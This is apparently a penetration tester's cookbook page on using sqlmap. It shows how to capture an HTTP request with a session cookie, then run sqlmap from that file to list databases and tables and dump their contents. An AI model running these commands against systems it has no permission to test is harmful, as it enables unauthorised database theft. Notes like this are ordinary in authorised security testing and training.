---
layout: default
title: SqlMap
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## SQLMap Using HTTP Request
First, capture a HTTP request containing the querystring/items you want to fuzz and save it to file. You may need to make the request first to get a cookie or session ID. Something like:
```bash
GET /page.php?id=1 HTTP/1.1
Host: host.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=dkjsol3fp464kafr9tpce0h3l1; XXXXX=jmoabd0jv2smj2g15n20mup26i
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Run SQLMap in stages using the request:
```bash
// Retrieve database names.
sqlmap -r <file-containing-request> --threads=10 --dbs

// Retrieve table names.
sqlmap -r <file-containing-request> --threads=10 -D <db-name> --tables

// Dump table contents.
sqlmap -r <file-containing-request> --threads=10 -D <db-name> -T <table-name> --dump
```